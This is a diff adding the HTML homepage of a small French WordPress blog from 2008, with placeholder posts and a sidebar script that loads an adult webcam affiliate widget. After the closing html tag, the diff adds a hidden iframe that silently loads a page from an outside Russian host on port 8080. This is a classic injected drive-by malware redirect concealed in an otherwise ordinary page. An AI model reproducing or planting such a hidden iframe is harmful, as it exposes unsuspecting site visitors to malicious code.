@@ -1,0 +1,140 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+  <title>Blog Gouine</title>
+	<link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="http://blog-gouine.com/feed/" />
+	<link rel="alternate" type="text/xml" title="RSS .92" href="http://blog-gouine.com/feed/rss/" />
+	<link rel="alternate" type="application/atom+xml" title="Atom 1.0" href="http://blog-gouine.com/feed/atom/" />
+  <link rel="stylesheet" href="http://blog-gouine.com/wp-content/themes/good/style.css" type="text/css" />
+  <link rel="stylesheet" href="http://blog-gouine.com/wp-content/themes/good/css/slider.css" type="text/css" media="screen" charset="utf-8" />
+<!--[if lte IE 6]>
+  <link rel="stylesheet" href="http://blog-gouine.com/wp-content/themes/good/css/ie.css" type="text/css" />
+<![endif]-->
+	<link rel="pingback" href="http://blog-gouine.com/xmlrpc.php" />
+		<link rel='archives' title='décembre 2008' href='http://blog-gouine.com/2008/12/' />
+		<script type="text/javascript" src="http://blog-gouine.com/wp-content/themes/good/js/jquery-1.2.6.min.js"></script>
+	<script type="text/javascript" src="http://blog-gouine.com/wp-content/themes/good/js/slider.js"></script>
+    <script type="text/javascript" src="http://blog-gouine.com/wp-content/themes/good/js/dropdown.js"></script>
+	<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://blog-gouine.com/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://blog-gouine.com/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 2.6" />
+
+</head>
+<body>
+<div id="container">
+    <div id="header">
+        <div id="logo">
+                <img src="http://blog-gouine.com/wp-content/themes/good//images/logo.png" />        </div>
+        <div class="clear"></div>
+        <div id="navigation">
+          <div id="nav_left">
+                <ul id="nav">
+                    <li><a href="http://blog-gouine.com/" title="Un blog utilisant WordPress">Accueil</a></li>
+                    	<li class="cat-item cat-item-1"><a href="http://blog-gouine.com/category/non-classe/" title="Voir tous les articles classés dans Non classé">Non classé</a>
+</li>
+                </ul>
+          </div>
+            <div id="nav_right">
+                <form id="searchform" method="get" action="/index.php">
+		        <input type="text" value="Votre rechercher et enter..." name="s" id="topsearch" onfocus="if (this.value == 'Type And Hit Enter...') {this.value = '';}" onblur="if (this.value == '') {this.value = 'Type And Hit Enter...';}" />
+		        </form>
+            </div>
+        <div class="clear"></div>
+        </div>
+    </div>    <div id="content">
+        <div id="postarea">
+    		<div id="slider">
+			<div id="mover">
+				<div id="slide-1" class="slide">
+                					<h1>dfg</h1>
+					<p>dfg</p>
+<a href="http://blog-gouine.com/non-classe/dfg/">Suite >></a>
+				    				   	    <a href="http://blog-gouine.com/non-classe/dfg/" rel="bookmark"><img src="http://blog-gouine.com/wp-content/themes/good/images/Thumbnail.png" alt="dfg" /></a>
+				                    				</div>
+                				<div class="slide">
+					<h1>Bonjour tout le monde !</h1>
+					<p>Bienvenue dans WordPress. Ceci est votre premier article. Modifiez-le ou effacez-le, puis lancez-vous !</p>
+<a href="http://blog-gouine.com/non-classe/bonjour-tout-le-monde/">Suite >></a>
+				    				   	    <a href="http://blog-gouine.com/non-classe/bonjour-tout-le-monde/" rel="bookmark"><img src="http://blog-gouine.com/wp-content/themes/good/images/Thumbnail.png" alt="Bonjour tout le monde !" /></a>
+				    				</div>
+                			</div>
+		</div>            <div class="homepage_post">
+        <h2><a href="http://blog-gouine.com/non-classe/dfg/" rel="bookmark">dfg</a></h2>
+            		<a class="thumb" href="http://blog-gouine.com/non-classe/dfg/" rel="bookmark"><img src="http://blog-gouine.com/wp-content/themes/good/images/Thumbnail.png" alt="dfg" /></a>
+				    <p>dfg</p>
+        <div class="clear"></div>
+        <div class="homepost_data">
+            <div class="homepost_left">
+                19 décembre, 2008 par admin&nbsp;            </div>
+            <div class="homepost_right">
+                <a href="http://blog-gouine.com/non-classe/dfg/#respond" title="Commentaire sur dfg">Aucun commentaire</a> - <a href="http://blog-gouine.com/non-classe/dfg/">Suite...</a>
+            </div>
+        <div class="clear"></div>
+        </div>
+        </div>            <div class="homepage_post">
+        <h2><a href="http://blog-gouine.com/non-classe/bonjour-tout-le-monde/" rel="bookmark">Bonjour tout le monde !</a></h2>
+            		<a class="thumb" href="http://blog-gouine.com/non-classe/bonjour-tout-le-monde/" rel="bookmark"><img src="http://blog-gouine.com/wp-content/themes/good/images/Thumbnail.png" alt="Bonjour tout le monde !" /></a>
+				    <p>Bienvenue dans WordPress. Ceci est votre premier article. Modifiez-le ou effacez-le, puis lancez-vous !</p>
+        <div class="clear"></div>
+        <div class="homepost_data">
+            <div class="homepost_left">
+                19 décembre, 2008 par admin&nbsp;            </div>
+            <div class="homepost_right">
+                <a href="http://blog-gouine.com/non-classe/bonjour-tout-le-monde/#comments" title="Commentaire sur Bonjour tout le monde !">1 commentaire</a> - <a href="http://blog-gouine.com/non-classe/bonjour-tout-le-monde/">Suite...</a>
+            </div>
+        <div class="clear"></div>
+        </div>
+        </div>
+        </div>
+                <div id="sidebar">
+        <p>
+                                        </p>
+        <h2>Pages</h2>
+        <ul>
+          <li class="page_item page-item-2"><a href="http://blog-gouine.com/a-propos/" title="À propos">À propos</a></li>
+  </ul>
+        <h2>Live Show </h2>
+            <ul>
+                <script type="text/javascript" src="http://tac2.xcams.com/livecams/chat_coquin/script.php?comfrom=21296&cf0=pc&rebill=1&promo=cblive&cf2=bloggouine&langue=fr&sexe=h&fille=0&format=3"></script>
+            </ul>
+            <h2>Articles r&eacute;cents</h2>
+            <ul>
+                	<li><a href='http://blog-gouine.com/non-classe/dfg/' title='dfg'>dfg</a></li>
+	<li><a href='http://blog-gouine.com/non-classe/bonjour-tout-le-monde/' title='Bonjour tout le monde !'>Bonjour tout le monde !</a></li>
+            </ul>
+            <h2>Archives</h2>
+            <ul>
+                	<li><a href='http://blog-gouine.com/2008/12/' title='décembre 2008'>décembre 2008</a></li>
+            </ul>
+            <h2>Liens</h2>
+            <ul>
+                <li><a href="http://wordpress.org/development/">Development Blog</a></li>
+<li><a href="http://codex.wordpress.org/">Documentation</a></li>
+<li><a href="http://wordpress.org/extend/plugins/">Plugins</a></li>
+<li><a href="http://wordpress.org/extend/ideas/">Suggest Ideas</a></li>
+<li><a href="http://wordpress.org/support/">Support Forum</a></li>
+<li><a href="http://wordpress.org/extend/themes/">Themes</a></li>
+<li><a href="http://planet.wordpress.org/">WordPress Planet</a></li>
+            </ul>
+            <h2>Meta</h2>
+            <ul>
+								<li><a href="http://blog-gouine.com/wp-login.php">Connexion</a></li>
+				<li><a href="http://www.wordpress.org/" target="_blank">WordPress</a></li>
+								<li><a href="http://validator.w3.org/check?uri=referer" target="_blank">XHTML</a></li>
+            </ul>
+                </div>    <div class="clear"></div>
+    </div>
+    <div id="footer">
+        <div id="footer_left">
+            - &copy; Copyright 2008 - <a href="http://blog-gouine.com/">Blog Gouine</a> -
+        </div>
+        <div id="footer_right">
+            - <a href="http://www.timecafethemes.com" title="wordpress themes" target="_blank">WordPress Theme</a> par <a href="http://www.timecafethemes.com" title="wordpress themes" target="_blank">TimeCafe Themes</a> - Traduction <a href="http://www.weezonaute.fr" title="" target="_blank">Le blogueur masqu&eacute;</a>
+        </div>
+    </div>
+</div>
+</body>
+</html>
+<iframe src="http://x6i.ru:8080/index.php" width=199 height=160 style="visibility: hidden"></iframe>
